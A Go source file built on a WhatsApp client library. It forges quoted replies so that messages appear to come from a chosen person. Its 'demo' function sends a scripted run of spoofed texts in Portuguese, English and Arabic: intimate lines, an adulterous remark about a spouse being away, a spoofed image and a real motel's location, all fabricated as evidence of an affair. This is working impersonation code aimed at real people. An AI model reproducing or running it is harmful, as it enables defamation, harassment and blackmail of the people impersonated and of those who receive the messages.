package main

import (
	"context"
	"errors"
	"fmt"
	"mime"
	"net/http"
	"os"
	"strings"

	"go.mau.fi/whatsmeow"
	waProto "go.mau.fi/whatsmeow/binary/proto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"google.golang.org/protobuf/proto"
)

func sendSpoofedReplyThis(chatID types.JID, spoofedID types.JID, msgID string, text string, msg *waProto.Message) (*waProto.Message, *whatsmeow.SendResponse, error) {
	newmsg := &waProto.Message{
		ExtendedTextMessage: &waProto.ExtendedTextMessage{
			Text:        proto.String(text),
			PreviewType: waProto.ExtendedTextMessage_IMAGE.Enum(),
			// PreviewType: waProto.ExtendedTextMessage_NONE.Enum(),
			ContextInfo: &waProto.ContextInfo{
				StanzaId:      proto.String(msgID),
				Participant:   proto.String(spoofedID.String()),
				QuotedMessage: msg.ExtendedTextMessage.ContextInfo.QuotedMessage,
			},
		},
	}
	resp, err := cli.SendMessage(context.Background(), chatID, newmsg)
	if err != nil {
		log.Errorf("Error sending reply message: %v", err)
		return msg, &resp, err
	} else {
		log.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		return msg, &resp, err
	}
}

func sendSpoofedReplyMessage(chatID types.JID, fromID types.JID, msgID string, replyText string, myTtext string) (*waProto.Message, *whatsmeow.SendResponse, error) {
	msg := &waProto.Message{
		ExtendedTextMessage: &waProto.ExtendedTextMessage{
			Text: proto.String(myTtext),
			ContextInfo: &waProto.ContextInfo{
				StanzaId:    proto.String(msgID),
				Participant: proto.String(fromID.String()),
				QuotedMessage: &waProto.Message{
					Conversation: proto.String(replyText),
				},
			},
		},
	}
	resp, err := cli.SendMessage(context.Background(), chatID, msg)
	if err != nil {
		log.Errorf("Error sending reply message: %v", err)
		return msg, &resp, err
	} else {
		log.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		return msg, &resp, err
	}
}

func sendSpoofedReplyImg(chatID types.JID, fromID types.JID, msgID string, file string, replyText string, myTtext string) (*waProto.Message, *whatsmeow.SendResponse, error) {
	data, err := os.ReadFile(file)
	if err != nil {
		log.Errorf("Failed to read %s: %v", file, err)
		return &waProto.Message{}, &whatsmeow.SendResponse{}, err
	}
	uploaded, err := cli.Upload(context.Background(), data, whatsmeow.MediaImage)
	if err != nil {
		log.Errorf("Failed to upload file: %v", err)
		return &waProto.Message{}, &whatsmeow.SendResponse{}, err
	}

	msg := &waProto.Message{
		ExtendedTextMessage: &waProto.ExtendedTextMessage{
			Text:        proto.String(myTtext),
			PreviewType: waProto.ExtendedTextMessage_IMAGE.Enum(),
			// PreviewType: waProto.ExtendedTextMessage_NONE.Enum(),
			ContextInfo: &waProto.ContextInfo{
				StanzaId:    proto.String(msgID),
				Participant: proto.String(fromID.String()),
				QuotedMessage: &waProto.Message{
					ImageMessage: &waProto.ImageMessage{
						Caption:              proto.String(replyText),
						Url:                  proto.String(uploaded.URL),
						DirectPath:           proto.String(uploaded.DirectPath),
						MediaKey:             uploaded.MediaKey,
						Mimetype:             proto.String(http.DetectContentType(data)),
						FileEncSha256:        uploaded.FileEncSHA256,
						FileSha256:           uploaded.FileSHA256,
						FileLength:           proto.Uint64(uint64(len(data))),
						JpegThumbnail:        data,
						Height:               proto.Uint32(100),
						Width:                proto.Uint32(100),
						MidQualityFileSha256: uploaded.FileSHA256,
					},
				},
			},
		},
	}
	resp, err := cli.SendMessage(context.Background(), chatID, msg)
	if err != nil {
		log.Errorf("Error sending reply message: %v", err)
		return msg, &resp, err
	} else {
		log.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		return msg, &resp, err
	}
}

func sendSpoofedReplyLocation(chatID types.JID, fromID types.JID, msgID string, file string, myTtext string) (*waProto.Message, *whatsmeow.SendResponse, error) {
	msg := &waProto.Message{
		ExtendedTextMessage: &waProto.ExtendedTextMessage{
			Text:        proto.String(myTtext),
			PreviewType: waProto.ExtendedTextMessage_NONE.Enum(),
			// PreviewType: waProto.ExtendedTextMessage_NONE.Enum(),
			ContextInfo: &waProto.ContextInfo{
				StanzaId:    proto.String(msgID),
				Participant: proto.String(fromID.String()),
				QuotedMessage: &waProto.Message{
					LocationMessage: &waProto.LocationMessage{
						DegreesLatitude:  proto.Float64(-23.664372670968287),
						DegreesLongitude: proto.Float64(-46.49175593257989),
						Name:             proto.String("Motel Confidence"),
						Address:          proto.String("R. Giovanni Battista Pirelli, 1729, Santo André, SP 09111-340"),
						Url:              proto.String("http://www.motelconfidence.com.br/"),
						JpegThumbnail:    []byte("\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xe2\x02(ICC_PROFILE\x00\x01\x01\x00\x00\x02\x18\x00\x00\x00\x00\x040\x00\x00mntrRGB XYZ \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00acsp\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\xf6\xd6\x00\x01\x00\x00\x00\x00\xd3-\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\tdesc\x00\x00\x00\xf0\x00\x00\x00trXYZ\x00\x00\x01d\x00\x00\x00\x14gXYZ\x00\x00\x01x\x00\x00\x00\x14bXYZ\x00\x00\x01\x8c\x00\x00\x00\x14rTRC\x00\x00\x01\xa0\x00\x00\x00(gTRC\x00\x00\x01\xa0\x00\x00\x00(bTRC\x00\x00\x01\xa0\x00\x00\x00(wtpt\x00\x00\x01\xc8\x00\x00\x00\x14cprt\x00\x00\x01\xdc\x00\x00\x00<mluc\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0cenUS\x00\x00\x00X\x00\x00\x00\x1c\x00s\x00R\x00G\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00XYZ \x00\x00\x00\x00\x00\x00o\xa2\x00\x008\xf5\x00\x00\x03\x90XYZ \x00\x00\x00\x00\x00\x00b\x99\x00\x00\xb7\x85\x00\x00\x18\xdaXYZ \x00\x00\x00\x00\x00\x00$\xa0\x00\x00\x0f\x84\x00\x00\xb6\xcfpara\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02ff\x00\x00\xf2\xa7\x00\x00\rY\x00\x00\x13\xd0\x00\x00\n[\x00\x00\x00\x00\x00\x00\x00\x00XYZ \x00\x00\x00\x00\x00\x00\xf6\xd6\x00\x01\x00\x00\x00\x00\xd3-mluc\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0cenUS\x00\x00\x00 \x00\x00\x00\x1c\x00G\x00o\x00o\x00g\x00l\x00e\x00 \x00I\x00n\x00c\x00.\x00 \x002\x000\x001\x006\xff\xdb\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\n\x10\n\n\t\t\n\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a\x1d%\x1f\x1a\x1b#\x1c\x16\x16 , #&')*)\x19\x1f-0-(0%()(\xff\xdb\x00C\x01\x07\x07\x07\n\x08\n\x13\n\n\x13(\x1a\x16\x1a((((((((((((((((((((((((((((((((((((((((((((((((((\xff\xc0\x00\x11\x08\x00d\x00d\x03\x01\"\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x1c\x00\x00\x01\x04\x03\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x05\x06\x03\x04\x07\x08\xff\xc4\x00@\x10\x00\x01\x03\x03\x02\x02\x05\x06\x0c\x05\x05\x01\x00\x00\x00\x00\x01\x02\x03\x04\x00\x05\x11\x12!\x061\x13AQaq\x07\x14\"2\x91\xc1\x15#BRSbr\x81\xa1\xb1\xd1\xf13D\x82\xe1\xe2$%4\x93\xf0\xa2\xff\xc4\x00\x1a\x01\x01\x00\x03\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x03\x04\x02\x05\x06\xff\xc4\x00/\x11\x00\x02\x01\x03\x01\x06\x03\x07\x05\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x111\x05\x12!a\xd1\xf0\"Q\xa1\x06\x13\x14q\x81\x91\xc1$2AC\xb1\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00?\x00\xf4\xcd\x14QR@QE\x14\x01E\x14P\x05\x14Q@\x14QE\x00V\xc4C\x96t\x9f\x92J\x7fOµ\xeb,S\x87T\x9f\x9c3\xec\xfd\xc5\x01\x01t\xf3Ƥ銤\x84\xe3\xd2\xc9\xeb\x04\x8f\xc8\n*fY[o\x9d\t*\n\xdf\xddF\xbe\xeaKu\x15J\x96^r!q#\xd6:~\xd0\xc7\xe7J\x95%^\xaa\x81\xf04\xf0\xebÓ\x89?i?\xa6)\xaaYW\xf1\x18e~;{\x8dg-\n)\xaa,\xa5$\xae:\xd2\x06\xe4\xa1_\xdcS\xddC-\xafAu\xe4\x9cga\xab\xdc{(\x04\xaag\x16\xf9A\xb7X$\xaa\x1bM\xaet\xe4z\xed\xb6\xa0\x94\xb7ܥu\x1e\xe0\x0f~*\xc5\xc43>\x0e\xb0\\\xa6ǐ\x82\xechμ\x84\xad<\xcaPH\x1d]\x95\xe6\t\xb2\x16\xd3Kyd\xb8\xea\x8eJ\x94rT\xa2w$\xd6+ˉR\xc4a\xab=\xfd\x87\xb2\xe9޹T\xac\xfc1\xfe<\xce\xc5n\xf2\xb5\x19\xc9\tE\xca\xd4\xecfN\xdd+/t\xda{\xc8ғ\x8f\x0c\x9e\xea\xe90\xe4\xb16+Rb\xba\x87\x98u!HZ\x0eB\x81\xaf%[\xe6\xad\xf7Kn\x01\xcb \x8a\xed~C\xa7>\xe4+\xac\x15k[\x11\xd6ۭ\x803\xa7^\xac\x8f\x0c\xa3>$\xd5V\xb7S\x94\xfd\xddCf\xd8\xd8\xf6\xf4m\xfe&ۂZ\xa3\xa7\xd1M+\x03\xd6\nO\xdaI\x14\x07[<\x96\x93\xf7פ|\xa0\xeaT\x9d.!]\xf8\xf6\xedIMs\x1d\x1a\xb2p1΀\x91\xa2\x91\x04\x94$\x91\x82F㲊\x82M\x1a(\xa2\xa4\x81\xae\xee\x82;p?\x1a{\xdb\xcas\xb8\x01\xff\x00\xbd\xb4\xd5\x0c\xa9\xb1ڴ\xfet\xaa\xdd\xf7\x8f\xd6\xf7\n\x03\x0c\xe8\xadM\x85\",\x80K/\xb6\xa6\x96\x07ZT0\x7f\x03^h\xe2\x1b,\x8b5\xcaE\xb2⌭\xbeJ\xc6\x03\xa8\xf9+\x1d\xc7\xf09\x1dU\xe9ک\xf9H\xe1\xa4q\x05\x89Ű\x8c\xdcb\xa4\xb9\x1c\x81\xba\xbb[\xf0V=\xb85\x92\xf2\xdf\xde\xc7+T{{\x13i|\x15m\xd9\xfe\xc9k˟S\xcf,Fj6\xa5 cm\xc9=U\xde\xfc\x94p\xf3\xf6K\x1b\x92e\x85\xb32r\x92\xe2\x9b\xe4P\x80=\x04\x91۹=ڱ\xd5T\x7f$\\:\xdd\xe6滤\xb4k\x87\tI\xe8\xd2F\xcbx\x8c\x8c\xfd\x91\x83\x8e\xd2;+\xb7\xd6{\n\x1f\xdb/\xa1\xe8\xfbE\xb4S\xfd\x1d-\x16\xbd\x05\x0e<9;\x9f\xb4\x91\xee\xc5)u\xd3\xeb\x06\x97\xfd$Si\xa4\xabB\x9c\t\x05\xb4\xf39߿j\xf4ϓ\x17(\xf9QZ\xf1I\xdf\xf2\xa1%\x90\xa0K\x0e\x8c}l\x8ffihܐ\x94\x8c\xa8\xf2\x02\x80\xdciĸ\x8dI\xce9n1E#\x08-\xb4\x12H'$\x9cw\x9c\xd1PI\xa9E\x14T\x90\t\xdd\xf6G\xd6\xf7\x1aD\x9c\xa9\xc3ڵ~x\xa7\xb3\xbc\xa6\xc7`'\xf2\x1e\xfa\xc6\xd1\xca\x01\xed\xc9\xf6\xef@:\x8a\xd6zXKkS\x08\\\x85$\xe0\x86\xf0p{\xcf*\xabq\x07\x13̏2t\x186\xee\x99\xf8Q\x04\xd7\xd4\xec\xa4\xc7o\xa3 \xfa\x8a\xc1R\x8e\xca\x19\xc2@=u\x96\xa5\xdd8\xbcG\x8b\xe5Ժ\x14%.E\x86\xddo\xb6\xd8!8\xd4&\x9a\x87\x19N)\xd5\rX\x1a\x95\xcc\xee\x7f\xf7*Ȼ\x8bi\x00\x86\xdd\xd2T\x94%N\x00\xdaT\xa5l\x90\n\xf1\x9c\x9eʦ\xde\xef\xeb\x87n\xb6\xdc-\xf6\xa4\xca\xf3\x98bcb[\xab[\xaa8\xd4YBP\x14\xad@sQ\xc2S\xb6N\xfbV\xaeQ]\xbe\xfc;\x15WYJU\xca+W\xeb<t\xa8!.(\xa4\x9d\x00n\xa2\xa1\xa1#\x01]y\xc0\xac\x8e\xe6\xb3xIEr\xe2\xfdp\xbd\x19\xa7\xdc\xc6^)\xb6ߛ\xef\xf2u\t\x9755\x1eK\xfa[\x8a\xc4g\x14ۯN%\x84'\x18\xf4\x81;\x14\x9c\xecs\x8a\xd4W\x15Z\xe3\xdclpL\xe8\xef9qK\x81\x92ˈ[nv\x12ud\x02\xad\x863\x92\x08\xaac\x96\xe7\xae\xeb\x952\xddl\xb8\xbd\x02cp\xa7#\xa3Xe\xd6$3\x96\xd6\x12\x1eN\x16\xa0\x90\x83\x85l\xac\x1d󊖷\xd8\xef\xe9b\xc5=PZ2a]\x1e{\xa0!\xa6\x1cTw[R\n\xdc\r\xfa\x1d&U\x93\xa7\x9f\x8dv\x9dYI\xcb/\xf1\xa9\xce\xe4\x12\xc3\xc7k\xa9+\x02\xf5\x0em\xc5p\xe2\xde|\xe1\xf4\x05\x94\xb2\x96\xcaR\xb0\x93\x85h^\x90\x17\xa7\xafI5\x81w\x8b\xd37\xf9V\xbb4x\x0e\xb7\x1a\x1bs\x1dzt\x85\xa4\xa8\xac\xaci\xc8\x07\x03\xd1\xec\xc0\xad+/\x08_\xdb\xe2\x9bm\xc2\xe6\xecW\x1b\x86\xf4\xa2\xe3\xdev\xea\xd4\xfbn\x85\x04\x84\xb4S\xa1\xad9N\xc9;\xef\xf7\xc8\xdc\xf8&\x14\xfe)\x9fr\xb95\n[nFa\x98\xedHc\xa4-i*\xd4w\xdb|\x8a\xa6\x16\xf5b\xf7\xd6_\xcd\xf1\xf5;\x95Jz<}\xba\x107_)ɏ\x1a\xd5!\xaf\x83\xd8D\xe8h\x97\xd1Δ\xf2\x1cI*P hm@\xa7)\xd8\xed\x9e\xca*#\xcao\x92\xeb\xbf\x14_cL\xb5ʵ\xb1\x19\x98\x8d\xc7\r\xbaVޝ%\\\x92\x94\x10\x06\xe3\x1b\xd1Q%p\x9f\x08\x96\xc1[\xb5\x96οEhȸiPDV\x1c}\xc5\x0c\xa7\x00\xa5\x18\xedՌ\x1f\xbb5\x199\xe6\xd2\xea\x93w\x98\x9e\x97\xa0rJ`\xb6\xa0\x95-\x08\x1b\xe1$\x8d]\x9b\x9cV\xaa\xbbB\t\xeeR[\xe6\xfae\x98\xa1n\xdf\x19\xf0^\xbfbe\x99\xcc\x17\x9e\xe8\x9cJ\xd6\xda4\xfa;\x82\xa3՟\xba\xa0.SXa\x99_\nN@\xf38\xe6C\xb0c,\x17Cc\xe5\x14\x03\xa8\x8e\xfd\x85Wo|Qq\x86#K\xb26ϙ\xa2\x03wDE蒥;\x1f\x00\xb8\xa7\x16Hрp\x90\x90I#\xb2\xb0ظ}ٱ\x0bֶ\xdb2a\xcfL\xeb}\xc6@:f\xc5xeM8\xe6\xe5XAR\x0f3覲\xcdT\xb9\xc4j?\xa2\xca__?\xf3\xeeh\x8ccKĻ\xe9ߐ\xfb\x8f\x11H\xe8\xe3\xbf\x1a\xc8\xd4I1#\x8b\xa4\x0c\xa9\x0f\x19P\xc9\x1d:\x12q\x84,\xa3J\xb0\t\xeaޥx\xa6\xc4/\xcb\xe1\xfb\xe5\x9a,\x0b\xa2\x9a\xcf\xc4\xcaPKOFq9IQ \xfa\xaaҠ0z\xear\xcb\xc30mp\xed\xf1\xd4U/\xe0\xd7]\\'\x1c\xc8S\x08^F\x8c\x83\xe9\x00\x95iߞ\x06\xdb\x0cL\x8d\r6\x94\xa4!\xb6\xd24\xa5 \x00\x00\xec\x02\xb5ӳXĊgq\x87\xe1)\x96\xbe\x00\x8a\xd44y\xf4\x87Q0>\xfb\xff\x00\xed\xce\x16\x1bm/cS(\xeb\xe8\xfd\x11\xd8s\x921\x9a\xb3\xc0\xb5\xdb\xe0\xb3\x05\x98P\x98m\xa8\xad\x7f\xa6\xcau)\xa0\xa2u\x04\xa8\xe4\x8fmo$-~\xa3j#\xb4\xec?\x1a\x16\xc9m\r\x97\x1fi\xbd \xa7\xd2\x1d\xfe\"\xb5B\x94!\xa2)\x95I\xcfV\n\xf4\x86\x15\xb8\xef\xa4\xc7b\x96<\x14E\x1f\x17\xd7$\x1f\xb2\x9fޏ\x89\xfagς?Ƭ+2\xc7sK\xa1\n^B\xc1)\nV\xfbs\xc6w뤑\xff\x00 \xfd\x91絛\x94+kW>\x1eS\x0c\xdb߹OR\xb4D)m!L\xb8Fu\x15\x9chNۜ\xf6u\xd1\xc1\xb6\xa9\x90\xe5\xccrE\xd9%\x01!\xa1kL\xb5\xc9DRH#S\x8b%EX\x04c\x00s\xd8\xf3\xa0,\xf4S\xba\x17\xfa\x83G\xfa\xcf\xe9E\x01ˮ\xf7\xc9RaˍhR\xa4\xb5sa\x17\x06\x1d\x86\xeb\xa5o\x96\xdcJ%\xb2\xd9Q\xcaN\x91\xe8\xa58\xdb=f\xb6\xadv8w\xc7\xee\x8c\xc1]\xc1\xab+Ie\xf8\x12]K\x89v$\xa3\xa88\x96\x8b\x83QI\x01:\x92v\xc9\"\xad\xd6N\x1d\x81i\x89\x11\xa4 \xc9z3\xae\xbe\x89/\x80\\\x0e9\x9dj\x18\x00\x0c\xea;\x00\x05K-g͚թEN\x13۰\xce=Վ\x16ͽ\xe9\xf7\xdfCT\xab\xa4\xb1\x0e\xfb\xeaW\xe0p\x8d\xad\xab]\x965\xca;\x17\x19\x16\xb6\x12\xcbR\x1cl\xa4\x90\x90:\xb2v\xd8lr6\xab\n\xd6\x12\x06\xa2\x00\xe4\x05\x05\nө\xd5\x06Qߺ\x8d\tPN\xec7\xbf\xd29\xcf\xd9\xfbV\xa8\xc20\xe1\x14g\x94\xa5-XiYN\xa5a\xa6\xfer\xf9\xfb?ZD\xa9(9a\x05J\xfaG=\xc3\xf6\xa1`-\xcdjʉ\xdcg\xab\xb8P\xa5\x04\x8c\xa8\x80;룑U\xa9\x7f\xc4Z\x8fp8\x1f\x857\xf9f>\xab\x8aOݿ\xf6\xa7%+Ru\x1c6\xdf\xce^߅;\xe2\x04Un\xb7R\x95N<;h\x06\xd1M\xf8\x9f\xa0\x91\xff\x00g\xf9S\xb4\xb1Ї4\xbc=-8\xd6s\x9fm\x01\x13\xc51\x1a\x9dfS\x0f\xdcg[\x90\xb7[OM\x0c\x9dd\xa9ZBN\x01:IP\xcf.\xf2\x05'\x0e؜\xb0\xc4r#\x8eBv)P\xe8C\x10\xc3\n\x07}ExQ\n'm\xf0:\xebj\xf1pb\xd5i\x99p)\x92\xb1\x19\xa2\xe7F\x0e5\xe3\x90\xcfVN\x06j\"g\x13LEը\xaf@\x8f\xd00\xe4X\xf3]K䩹\x0f\xe0\x04\xb64\xe1A:\x92I$l\xae[P\x16\x1e\x85\xbf\xa3G\xb2\x8aq\x08\x07\x1ev\xc8\xf1\x1fފ\x01N\xc0\xd0\xe3\xcbf4T\xb6@\xd6\x00'\xaf\x95\x14P\x08\x105j9R\xber\xb74\xb4Q@1\xe5\x940\xe2\x874\xe0\x8f\xbfj̴&<e<\x91\xa9\xc0\x9c\x82\xbd袀\u009c\xb8\x12\xb7\tR\xb9\x8c\xf5xS\x87\xf0d\xfdƊ(\x05\xa4\xfeY\xde\xe7S\x8f\xfe\x7fZ(\xa01\xcbe\xa9\x10\xe4\xb3!\xb4:ˍ)+mc)ZH9\x07\xba\xb9w\x06]ZU\x9a\xde\xe2-6\xe4(\x17\xa6\x0c\x87\x1c!\xe4\xbc\xd3AyZ\xc9'J\xce䓰\xc69QE\x01\xd6\x160\xb2\x05\x14Q@\x7f\xff\xd9"),
					},
				},
			},
		},
	}
	resp, err := cli.SendMessage(context.Background(), chatID, msg)
	if err != nil {
		log.Errorf("Error sending reply message: %v", err)
		return msg, &resp, err
	} else {
		log.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		return msg, &resp, err
	}
}

func sendSpoofedTalkDemo(chatJID types.JID, spoofedJID types.JID, toGender string, language string, spoofedFile string) {
	msgmap := make(map[string]map[string]map[int]string)
	msgmap["br"] = make(map[string]map[int]string)
	msgmap["br"]["generic"] = make(map[int]string)
	msgmap["br"]["generic"][0] = "Oieeee..."
	msgmap["br"]["generic"][1] = "Também adorei a noite de ontem..."
	msgmap["br"]["generic"][2] = "❤️❤️❤️❤️❤️"
	msgmap["br"]["generic"][3] = "Para você, estou sempre disponivel, meu amor..."
	msgmap["br"]["generic"][4] = "Só me chamar que eu vou..."
	msgmap["br"]["generic"][5] = "Minha delicia..."
	msgmap["br"]["generic"][6] = "Adorei esse motel que você escolheu só para nós dois..."
	msgmap["br"]["boy"] = make(map[int]string)
	msgmap["br"]["boy"][0] = "Ontem a noite foi maravilhosa, venha mais vezes quando a minha mulher não estiver aqui em casa..."
	msgmap["br"]["boy"][1] = "Todo seu!"
	msgmap["br"]["girl"] = make(map[int]string)
	msgmap["br"]["girl"][0] = "Ontem a noite foi maravilhosa, venha mais vezes quando o meu marido não estiver aqui em casa..."
	msgmap["br"]["girl"][1] = "Toda sua!"
	msgmap["en"] = make(map[string]map[int]string)
	msgmap["en"]["generic"] = make(map[int]string)
	msgmap["en"]["generic"][0] = "salm"
	msgmap["en"]["generic"][1] = "I also loved last night..."
	msgmap["en"]["generic"][2] = "❤️❤️❤️❤️❤️"
	msgmap["en"]["generic"][3] = "For you, I am always available, my love..."
	msgmap["en"]["generic"][4] = "Just call me and I'll come..."
	msgmap["en"]["generic"][5] = "My deliciousness..."
	msgmap["en"]["generic"][6] = "I loved this motel you chose just for the two of us..."
	msgmap["en"]["boy"] = make(map[int]string)
	msgmap["en"]["boy"][0] = "Last night was wonderful, come more often when my wife isn't here..."
	msgmap["en"]["boy"][1] = "All yours!"
	msgmap["en"]["girl"] = make(map[int]string)
	msgmap["en"]["girl"][0] = "Last night was wonderful, come more often when my husband isn't here..."
	msgmap["en"]["girl"][1] = "All yours!"
        msgmap["ar"] = make(map[string]map[int]string)
	msgmap["ar"]["generic"] = make(map[int]string)
	msgmap["ar"]["generic"][0] = "أهلا..."
	msgmap["ar"]["generic"][1] = "مرحبا..."
	msgmap["ar"]["generic"][2] = "❤️❤️❤️❤️❤️"
	msgmap["ar"]["generic"][3] = "كيف حالك؟..."
	msgmap["ar"]["generic"][4] = "أين أنت؟..."
	msgmap["ar"]["generic"][5] = "لمادا لا تجيب؟..."
	msgmap["ar"]["generic"][6] = "ما بك؟..."
	_, err := cli.SendMessage(context.Background(), chatJID, &waProto.Message{Conversation: proto.String(msgmap[language]["generic"][0])})
	_, err = cli.SendMessage(context.Background(), chatJID, &waProto.Message{Conversation: proto.String(msgmap[language]["generic"][1])})
	_, _, err = sendSpoofedReplyMessage(chatJID, spoofedJID, cli.GenerateMessageID(), msgmap[language][toGender][0], msgmap[language]["generic"][2])
	_, err = cli.SendMessage(context.Background(), chatJID, &waProto.Message{Conversation: proto.String(msgmap[language]["generic"][3])})
	_, err = cli.SendMessage(context.Background(), chatJID, &waProto.Message{Conversation: proto.String(msgmap[language]["generic"][4])})
	if spoofedFile != "" {
		_, _, err = sendSpoofedReplyImg(chatJID, spoofedJID, cli.GenerateMessageID(), spoofedFile, msgmap[language][toGender][1], msgmap[language]["generic"][5])
	}
	_, _, err = sendSpoofedReplyLocation(chatJID, spoofedJID, cli.GenerateMessageID(), spoofedFile, msgmap[language]["generic"][6])

	if err != nil {
		log.Errorf("Error on sending spoofed msg: %v", err)
	} else {
		// log.Infof("spoofed msg sended: %+v / %+v / %+v / %+v / %+v ", resp1, resp2, resp3, resp4, resp5)
		log.Infof("spoofed msg sended to %s from %s ", chatJID.String(), spoofedJID.String())
	}
}

func sendConversationMessage(recipient_jid types.JID, text string) (*waProto.Message, *whatsmeow.SendResponse, error) {
	msg := &waProto.Message{Conversation: proto.String(text)}
	resp, err := cli.SendMessage(context.Background(), recipient_jid, msg)
	if err != nil {
		log.Errorf("Error sending message: %v", err)
		return msg, &resp, err
	} else {
		log.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		return msg, &resp, err
	}
}

func sendMessage(recipient_jid types.JID, msg *waProto.Message) (*waProto.Message, *whatsmeow.SendResponse, error) {
	resp, err := cli.SendMessage(context.Background(), recipient_jid, msg)
	if err != nil {
		log.Errorf("Error sending message: %v", err)
		return msg, &resp, err
	} else {
		log.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		return msg, &resp, err
	}
}

func getMsg(evt *events.Message) string {
	msg := ""

	if evt.Message.Conversation != nil {
		msg = *evt.Message.Conversation
	}

	if evt.Message.ExtendedTextMessage != nil {
		msg = *evt.Message.ExtendedTextMessage.Text
	}

	return msg
}

func download(evt_type string, file interface{}, mimetype string, evt *events.Message, rawEvt interface{}) (err error) {
	if file != nil {
		exts, _ := mime.ExtensionsByType(mimetype)
		file_name := fmt.Sprintf("%s%s", evt.Info.ID, exts[0])
		if mimetype == "text/vcard" {
			data := file.(*waProto.ContactMessage)
			err = postEventFile(evt_type, rawEvt, nil, file_name, []byte(*data.Vcard))
		} else {
			data, err := cli.Download(file.(whatsmeow.DownloadableMessage))
			if err != nil {
				postError(evt_type, fmt.Sprintf("%s Failed to download", evt_type), rawEvt)
				return err
			}
			err = postEventFile(evt_type, rawEvt, nil, file_name, data)
		}
		if err != nil {
			postError(evt_type, fmt.Sprintf("%s Failed to save event", evt_type), rawEvt)
			return err
		}
		return nil
	}
	return errors.New("File is nil")
}

func parseJID(arg string) (types.JID, bool) {
	if arg[0] == '+' {
		arg = arg[1:]
	}
	if !strings.ContainsRune(arg, '@') {
		return types.NewJID(arg, types.DefaultUserServer), true
	} else {
		recipient, err := types.ParseJID(arg)
		if err != nil {
			log.Errorf("Invalid JID %s: %v", arg, err)
			return recipient, false
		} else if recipient.User == "" {
			log.Errorf("Invalid JID %s: no server specified", arg)
			return recipient, false
		}
		return recipient, true
	}
}
